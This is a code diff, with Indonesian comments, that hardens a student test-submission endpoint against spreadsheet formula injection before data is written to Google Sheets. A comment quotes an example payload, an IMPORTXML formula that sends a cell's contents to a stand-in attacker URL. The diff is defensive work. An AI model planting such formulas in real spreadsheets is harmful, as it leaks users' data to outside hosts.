@@ -8,8 +8,24 @@ const SHEET_WEBHOOK_TOKEN       = process.env.SHEET_WEBHOOK_TOKEN
 
 const MAX_TEXT = 80
 
+// Karakter pembuka yang membuat Google Sheets memperlakukan isi sel sebagai
+// RUMUS, bukan teks. Tanpa penetralan, isian seperti
+//   =IMPORTXML("https://penyerang/?d="&B2)
+// akan dieksekusi saat Sheet dibuka dan bisa mengirim isi sel ke luar.
+const AWALAN_RUMUS = /^[=+\-@]/
+
 function bersih(s) {
-  return String(s ?? '').trim().slice(0, MAX_TEXT)
+  let v = String(s ?? '').replace(/[\r\n\t]+/g, ' ').trim().slice(0, MAX_TEXT)
+  // Apostrof di depan memaksa Sheets membaca sebagai teks; apostrofnya sendiri
+  // tidak ikut tampil, jadi datanya tetap terbaca apa adanya saat dianalisis.
+  if (AWALAN_RUMUS.test(v)) v = "'" + v
+  return v
+}
+
+// NIM dipakai sebagai KUNCI (dedupe & pencarian skor pra-tes), jadi tidak boleh
+// diberi apostrof — cukup dibatasi ke karakter yang aman saja.
+function bersihNim(s) {
+  return String(s ?? '').trim().replace(/[^A-Za-z0-9._-]/g, '').slice(0, 30)
 }
 
 export async function POST(request) {
@@ -32,7 +48,7 @@ export async function POST(request) {
   }
 
   // ── Validasi input ──
-  const nim   = bersih(body.nim)
+  const nim   = bersihNim(body.nim)
   const nama  = bersih(body.nama)
   const kelas = bersih(body.kelas)
   const form  = body.form === 'pre' || body.form === 'post' ? body.form : null
@@ -63,7 +79,8 @@ export async function POST(request) {
     ail2: Number(perDim.AIL2) || 0,
     ail3: Number(perDim.AIL3) || 0,
     ail4: Number(perDim.AIL4) || 0,
-    jawaban: JSON.stringify(Array.isArray(body.jawaban) ? body.jawaban.slice(0, 25) : []),
+    // Dibatasi panjangnya supaya tidak ada sel raksasa yang masuk ke Sheet
+    jawaban: JSON.stringify(Array.isArray(body.jawaban) ? body.jawaban.slice(0, 25) : []).slice(0, 2000),
   }
 
   try {
